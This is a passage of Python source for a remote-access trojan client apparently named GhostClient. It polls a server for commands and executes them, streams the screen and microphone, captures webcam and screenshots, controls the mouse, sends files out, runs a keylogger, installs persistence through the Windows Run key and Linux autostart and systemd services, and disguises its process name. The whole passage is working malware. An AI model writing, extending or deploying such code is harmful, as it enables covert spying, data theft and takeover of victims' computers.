                    self._report_cmd(cmd_str, 'screen stream stopped')
                    continue

                # ── Mic controls ────────────────────────────────────────────
                if cmd_str == 'start_mic':
                    start_mic_stream(self._hostname)
                    self._report_cmd(cmd_str, 'mic stream started')
                    continue
                if cmd_str == 'stop_mic':
                    stop_mic_stream()
                    self._report_cmd(cmd_str, 'mic stream stopped')
                    continue

                # ── Mouse commands ──────────────────────────────────────────
                if cmd_str.lower().startswith('mouse:'):
                    result = MouseControl.execute(cmd_str)
                    self._report_cmd(cmd_str, result)
                    continue

                # ── Execute command ─────────────────────────────────────────
                result = CommandExecutor.execute(cmd_str)
                if not result:
                    continue

                rtype = result.get('type', 'cmd_result')

                # ── File download response ──────────────────────────────────
                if rtype == 'file_download':
                    dl_payload = {
                        'hostname':      self._hostname,
                        'file_download': {
                            'path':     result.get('path', ''),
                            'data_b64': result.get('data_b64', ''),
                        },
                        'cmd_result': {
                            'cmd':    cmd_str,
                            'output': result.get('output', 'file sent'),
                        },
                    }
                    self._send_payload(dl_payload)
                    continue

                # ── Screenshot / snapshot / webcam ──────────────────────────
                extra = {}
                if rtype in ('screenshot', 'snapshot', 'webcam') and result.get('data'):
                    key = result.get('data_key', 'snapshot_b64')
                    extra[key] = result['data']

                # ── Browse / ls — also send file_list in same ping ──────────
                if result.get('file_list') is not None:
                    extra['file_list']      = result['file_list']
                    extra['file_list_path'] = result.get('file_list_path', '/')

                self._report_cmd(
                    cmd_str,
                    result.get('output', '')[:50000],
                    extra if extra else None,
                )

        except Exception:
            pass

    # ── Main loop ────────────────────────────────────────────────────────────

    def run(self):
        mutex = SingleInstance()
        if not mutex.acquire():
            return

        self._running = True
        self._save_config()
        start_keylogger()

        retry = 0
        while self._running:
            try:
                payload  = self._collect_payload()
                response = self._send_payload(payload)
                if response:
                    self._process_response(response)
                    retry = 0
                    time.sleep(self._interval)
                else:
                    retry += 1
                    time.sleep(min(30 * retry, 300))
                    if retry >= 10:
                        retry = 0
            except Exception:
                time.sleep(60)

        stop_screen_stream()
        stop_mic_stream()
        mutex.release()

# ==============================================================================
# PERSISTENCE
# ==============================================================================

def setup_persistence():
    try:
        if platform.system() == 'Windows':
            import winreg
            k = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                               r"Software\Microsoft\Windows\CurrentVersion\Run",
                               0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(k, TASK_NAME, 0, winreg.REG_SZ,
                              f'"{sys.executable}" "{__file__}"')
            winreg.CloseKey(k)
        else:
            autostart = Path.home() / '.config' / 'autostart'
            autostart.mkdir(parents=True, exist_ok=True)
            (autostart / f'{TASK_NAME}.desktop').write_text(
                f'[Desktop Entry]\nType=Application\nName={TASK_NAME}\n'
                f'Exec={sys.executable} "{__file__}"\n'
                f'X-GNOME-Autostart-enabled=true\n'
            )
            service_dir = Path.home() / '.config' / 'systemd' / 'user'
            service_dir.mkdir(parents=True, exist_ok=True)
            (service_dir / f'{TASK_NAME}.service').write_text(
                f'[Unit]\nDescription={TASK_NAME}\nAfter=network.target\n\n'
                f'[Service]\nType=simple\n'
                f'ExecStart={sys.executable} "{__file__}"\n'
                f'Restart=always\nRestartSec=30\n'
                f'StandardOutput=null\nStandardError=null\n\n'
                f'[Install]\nWantedBy=default.target\n'
            )
            for cmd in (
                ['systemctl', '--user', 'daemon-reload'],
                ['systemctl', '--user', 'enable', f'{TASK_NAME}.service'],
                ['systemctl', '--user', 'start',  f'{TASK_NAME}.service'],
            ):
                subprocess.run(cmd, capture_output=True, check=False)
    except Exception:
        pass

# ==============================================================================
# ENTRY POINT
# ==============================================================================

if __name__ == '__main__':
    try:
        if platform.system() != 'Windows':
            try:
                import ctypes
                ctypes.CDLL(None).prctl(15, TASK_NAME.encode(), 0, 0, 0)
            except Exception:
                pass

        flag = CACHE_DIR / '.installed'
        if not flag.exists():
            setup_persistence()
            flag.write_text('1')

        GhostClient().run()
    except Exception:
        pass
